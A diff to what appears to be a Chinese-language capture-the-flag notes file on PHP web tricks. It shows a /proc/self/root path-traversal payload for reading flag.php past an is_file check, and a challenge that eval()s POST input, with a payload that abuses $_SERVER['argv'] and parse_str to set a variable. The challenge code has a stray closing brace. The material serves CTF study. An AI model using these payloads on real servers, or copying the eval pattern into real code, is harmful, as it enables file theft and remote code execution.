@@ -191,3 +191,37 @@ if(! is_file($file)){
 ?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
 
 ```
+
+
+^
+## **$_SERVER['argv']**
+```
+对于?a=b+fl0g=flag_give_me
+$a=$_SERVER['argv']; //为数组
+
+$_SERVER['argV'][0]为 a=b
+$_SERVER['argV'][1]为 fl0g=flag_give_me
+```
+```
+<?php
+ 
+$a=$_SERVER['argv'];
+$c=$_POST['fun'];
+eval("$c".";");  
+
+if(!isset($_GET['fl0g'])){
+         if($fl0g==="flag_give_me"){
+             echo $flag;
+         }
+    }
+}
+?>
+
+
+Payload：
+GET：?a=1+fl0g=flag_give_me
+POST：fun=parse_str($a[1])
+
+由$_SERVER['argV'][1]为 fl0g=flag_give_me
+通过parse_str得 $fl0g=flag_give_me
+```
